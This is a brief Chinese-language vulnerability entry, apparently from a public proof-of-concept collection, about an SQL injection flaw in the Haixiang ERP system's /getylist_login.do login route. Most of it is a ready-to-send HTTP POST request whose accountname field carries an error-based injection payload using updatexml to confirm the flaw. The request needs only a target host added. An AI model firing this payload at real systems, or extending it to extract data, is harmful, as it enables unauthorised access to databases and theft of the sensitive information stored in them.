## 海翔ERP SQL注入漏洞

海翔ERP存在SQL注入漏洞，由于系统未对用户输入的内容进行过滤，攻击者可以通过/getylist_login.do路由进行SQL注入，从而获取数据库中的敏感信息。


## poc
```
POST /getylist_login.do HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Content-Length: 77
Accept-Encoding: gzip
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

accountname=test' and (updatexml(1,concat(0x7e,(select md5(123)),0x7e),1));--
```

